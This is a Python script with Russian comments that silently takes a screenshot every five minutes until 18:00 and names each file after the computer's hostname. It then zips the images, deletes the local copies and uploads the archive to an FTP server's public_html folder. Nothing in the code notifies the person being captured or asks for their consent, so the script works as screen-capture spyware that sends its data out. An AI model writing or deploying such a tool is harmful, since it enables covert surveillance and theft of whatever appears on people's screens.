from PIL import Image, ImageGrab
from datetime import datetime, date, time
import sched, time
import os
import zipfile
import shutil
import socket
import ftplib

#Создать папку если ее нет
if not os.path.exists('./screen'):
    os.makedirs('./screen')

directory = './'
#Найти в директории файл с расширением .zip
files = os.listdir(directory)
fzip = filter(lambda x: x.endswith('.zip'), files)

#Записать в переменную список файлов с расширением .zip
zip_paths = list(fzip)
for path in zip_paths:
    #Удалить все файлы с расширением .zip
    os.remove(path)

s = sched.scheduler(time.time, time.sleep)

#Делать скриншот по времени
def do_something(sc):

    #Получение текущего времени
    dt = datetime.strftime(datetime.now(), "%H%M%S")

    #Проверка текущего времени, если больше указанного - остановить.
    if dt < ("1800"):

        #Получение скриншота
        img = ImageGrab.grab()

        # Получить имя компьтера
        hostname = socket.gethostname()

        #Сохранение скриншота в папке с расширением
        img.save('./screen/' + hostname+ dt + ".png", "PNG")

        #Повторять скрипт указанное время
        s.enter(300, 1, do_something, (sc,))

#ПоПовторять скрипт указанное время
s.enter(300, 1, do_something, (s,))

#Запуск задачи
s.run()

#Получить имя компьтера
hostname = socket.gethostname()

#Получить текущее время
dt = datetime.strftime(datetime.now(), "%H%M%S")

#Создание архива
def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':

    #Создать архив с названием компьютера
    zipf = zipfile.ZipFile(hostname + dt + '.zip', 'w', zipfile.ZIP_DEFLATED)

    #Взять файлы с указанной папки
    zipdir('./screen', zipf)
    zipf.close()

#Удалить папку
path = './screen'
shutil.rmtree(path, True)

#Подключиться к FTP
host = ""
ftp_user = ""
ftp_password = ""

#Найти в директории файл с расширением .zip
files = os.listdir(directory)
fzip = filter(lambda x: x.endswith('.zip'), files)

#Записать в переменную список файлов с расширением .zip
zip_paths = list(fzip)

#Подключиться к FTP
con = ftplib.FTP(host, ftp_user, ftp_password)

#Выбрать директорию
con.cwd('/public_html/screen/')

#Загрузить на FTP архив
for path in zip_paths:
    f = open(path, "rb")
    send = con.storbinary("STOR " + path, f)

#Закрыть соединение
con.close

